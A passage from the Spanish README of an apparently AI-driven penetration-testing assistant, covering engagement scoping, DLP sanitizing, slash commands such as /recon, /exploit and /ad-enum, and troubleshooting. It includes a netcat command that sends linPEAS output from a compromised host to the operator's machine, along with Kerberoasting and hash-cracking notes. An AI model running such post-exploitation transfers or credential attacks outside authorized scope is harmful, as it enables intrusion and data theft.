  /session-close             <- siempre cerrar antes de salir
```

### Scope y DLP — habitos criticos

1. **Nunca ejecutar** `/recon` ni `/vuln-scan` sin `scope.md` completo
2. **Siempre inicializar** el mapa DLP despues de completar el scope:
   ```bash
   python3 tools/sanitizer.py findings/<engagement_dir> --init
   ```
3. **Sanitizar archivos** antes de pasarselos al agente para analisis manual:
   ```bash
   python3 tools/sanitizer.py findings/<dir> <archivo>
   ```
4. Al redactar hallazgos manualmente, **usar los tokens** del mapa, no los valores reales

### Modo -auto vs interactivo

- Usar `-auto` cuando el target esta bien definido y queres resultados rapidos
- Usar interactivo cuando es un target nuevo y queres controlar el ritmo
- En entornos con IDS/IPS, el interactivo permite pausar entre fases para reducir ruido
- `/exploit -auto` sigue pidiendo confirmacion siempre — no hay forma de saltarse eso

### Multiple terminales

Para trabajo eficiente con modo `-auto`:

```
Terminal 1: asistente (claude)
Terminal 2: tail -f logs/livefeed/<ultimo_log>
Terminal 3: vim/nano para editar scope.md y context.md
```

### Naming de engagements

Convencion recomendada: `<cliente>-<tipo>-<año>` o `<plataforma>-<nombre>`

```
# Engagements de clientes
acme-corp-webapp-2026
banco-xyz-infra-2026

# Laboratorios y CTF
lab-htb-active
lab-thm-overpass
ctf-hackthebox-2026

# Bug bounty
bb-programa-ejemplo-com
```

Esto facilita el uso de `/status` y `/session-close` con nombre parcial:
```
/status acme        <- encuentra acme-corp-webapp-2026 automaticamente
/session-close banco <- encuentra banco-xyz-infra-2026
```

### Git en engagements

Cada engagement tiene su propio repositorio git. El asistente hace commits
automaticos en `/session-close`, pero se puede hacer commit manual en cualquier momento:

```bash
cd findings/2026-06-08_acme-corp-2026
git log --oneline   # ver historial de la sesion
git add .
git commit -m "recon: nmap completo, 5 puertos abiertos"
```

El `.gitignore` del engagement excluye pcaps, evidencias binarias, logs y el mapa DLP.

### MITRE ATT&CK — uso como referencia rapida

```bash
# Buscar la tecnica para un hallazgo antes de documentarlo
python3 tools/map-mitre.py "tipo_de_hallazgo"

# Ver todas las tecnicas de una tactica especifica
python3 tools/map-mitre.py --list-tactics

# Verificar que el finding ya generado tiene la tecnica correcta
python3 tools/map-mitre.py --finding findings/<eng>/vulns/finding_001.md
```

El mapper no reemplaza el criterio del operador — es un punto de partida. Siempre
verificar la tecnica en https://attack.mitre.org antes de incluirla en el reporte final.

### Active Directory — checklist pre-engagament

Antes de ejecutar `/ad-enum`, verificar en `scope.md`:
- IP del Domain Controller esta en la tabla de targets autorizados
- Se especifica si el engagement incluye Kerberoasting o BloodHound
- Se tiene el nombre del dominio (FQDN: corp.local, empresa.internal, etc.)

Si se obtienen hashes Kerberos, ejecutar el crackeo offline fuera del contenedor
si los recursos de CPU son limitados. Los archivos de hashes quedan en
`findings/<engagement>/recon/ad/`.

### linPEAS / winPEAS — transferencia al engagement

```bash
# Desde el host comprometido via nc
nc -w 3 <tu_ip> 9999 < /tmp/linpeas.txt

# Receptar en tu maquina
nc -lvp 9999 > findings/<engagement>/post-exploitation/linpeas_output.txt

# Luego parsear
/parse-privesc <engagement> findings/<engagement>/post-exploitation/linpeas_output.txt
```

### Docker — rebuild selectivo

Si solo cambias archivos de comandos o CLAUDE.md, no hace falta rebuild:
```bash
# Solo cambia configuracion del agente — no necesita rebuild
docker compose run --rm assistant

# Cambias el Dockerfile o los scripts de herramientas — rebuild necesario
docker compose build --no-cache
```

---

## 11. Troubleshooting

### El agente no encuentra el engagement

```
Sintoma: /status no encuentra el engagement
Causa: el nombre parcial no coincide con ninguna carpeta en findings/

Solucion: usar el nombre completo o verificar con:
ls findings/
```

### scope.md no encontrado al ejecutar /recon

```
Sintoma: "Target no encontrado en scope.md — abortando"
Causa: el target no esta en la tabla de targets del scope.md del engagement activo

Solucion:
1. Verificar que scope.md tiene el target en la tabla "Targets autorizados"
2. Asegurar que el formato de la IP/dominio coincide exactamente
3. Si el engagement es nuevo, confirmar que /new-engagement se ejecuto correctamente
```

### El mapa DLP no se inicializa

```
Sintoma: python3 tools/sanitizer.py ... --init no genera el mapa
Causa: scope.md esta vacio o tiene solo el template sin completar

Solucion: completar scope.md con IPs/dominios reales en la tabla de targets
y volver a ejecutar --init
```

### Docker — la VPN no conecta

```
Sintoma: "VPN no pudo establecerse en 30s" en el arranque del contenedor
Causas comunes:
  - El archivo .ovpn requiere credenciales interactivas
  - El servidor VPN no es alcanzable desde el contenedor
  - Falta permiso NET_ADMIN (no deberia ocurrir con el docker-compose.yml incluido)

Verificar:
  docker compose run --rm assistant bash
  cat /workspace/logs/openvpn.log   # dentro del contenedor
```

### Claude Code no reconoce los slash commands

```
Sintoma: /recon o /vuln-scan no ejecutan nada o dan error
Causa: Claude Code no esta leyendo el directorio .claude/commands/

Solucion:
1. Verificar que estas en el directorio raiz del proyecto cuando abres claude
2. En modo Docker, verificar que el volumen de .claude esta montado correctamente
3. Reiniciar Claude Code desde el directorio correcto:
   cd /path/to/OffSec-Assistant && claude
```

### Herramientas no disponibles en Docker

```
Sintoma: [SKIP] nmap no instalado dentro del contenedor
Causa: el build de Docker no completo correctamente

Solucion:
  docker compose build --no-cache
  # Si persiste, verificar la salida del build para errores de apt
```

### Permisos en los directorios de findings/

```
Sintoma: "Permission denied" al crear archivos dentro del contenedor
Causa: los directorios de findings/ en el host no tienen los permisos correctos

Solucion (en el host):
  chmod 755 findings/ reports/ logs/
  # O si el contenedor corre como root:
  sudo chown -R $USER:$USER findings/ reports/ logs/
```

### Herramientas AD no disponibles en modo nativo

```
Sintoma: [SKIP] enum4linux-ng no instalado
Causa: las herramientas AD no estan en los repos oficiales de Arch/Manjaro

Solucion:
  pip install impacket ldapdomaindump bloodhound netexec enum4linux-ng

  Para impacket con todos los scripts en PATH:
  pip install impacket
  # Los scripts quedan en ~/.local/bin/ o /usr/local/bin/
  # Verificar: which GetUserSPNs.py

  En Docker: las herramientas AD estan incluidas en la imagen (target lite y full).
```

### Burp API no responde

```
Sintoma: "/burp-scan status" falla con "Conexion fallida"
Causas comunes:
  - Burp Suite no esta corriendo
  - La REST API no esta habilitada
  - El puerto (default 1337) esta bloqueado o cambiado
  - BURP_API_KEY no esta seteada o es incorrecta

Verificar:
  1. Burp Suite Pro corriendo: verificar en la barra de tareas
  2. REST API habilitada: User options > Suite > REST API > Enable
  3. Puerto correcto: User options > Suite > REST API > Port
  4. API Key: copiar desde la misma ventana

  Si Burp corre en otra maquina:
    export BURP_HOST=<ip_de_burp>
    /burp-scan status
```

### parse-privesc no detecta vectores

```
Sintoma: el parser retorna "severidad: Info" con 0 vectores detectados
Causas comunes:
  - El archivo tiene solo codigos ANSI sin texto legible (captura de terminal incompleta)
  - El archivo es de una version muy antigua de linPEAS/winPEAS con formato diferente
  - El archivo se llama igual pero es de otra herramienta

Solucion:
  # Verificar que el archivo tiene contenido legible
  head -50 <archivo> | cat

  # Ver output raw sin ANSI
  cat -v <archivo> | head -50

  # Si tiene ANSI, strip manual y reintentar
  sed 's/\x1b\[[0-9;]*m//g' <archivo> > /tmp/linpeas_clean.txt
  /parse-privesc <engagement> /tmp/linpeas_clean.txt
```

### ad-enum falla en BloodHound collection

```
Sintoma: [SKIP] BloodHound collection fallo
Causas comunes:
  - bloodhound-python no esta instalado (pip install bloodhound)
  - Las credenciales son incorrectas o el usuario no tiene permisos suficientes
  - El DC no acepta la conexion (firewall, SMB signing strict)
  - El nombre de dominio es incorrecto (FQDN requerido)

Solucion:
  # Verificar instalacion
  bloodhound-python --version

  # Probar con dominio explicito
  /ad-enum <dc> <eng> --user <u> --pass <p> --domain corp.local --dc-ip <ip> --bloodhound

  # Si falla, intentar primero solo enum4linux-ng para confirmar conectividad
  /ad-enum <dc> <eng> --anon
```

---

*Para contribuir al proyecto ver [CONTRIBUTING.md](CONTRIBUTING.md).*
*Para reportar bugs o sugerir features ver las [Issues](https://github.com/Joscalion04/OffSec-Assistant/issues).*
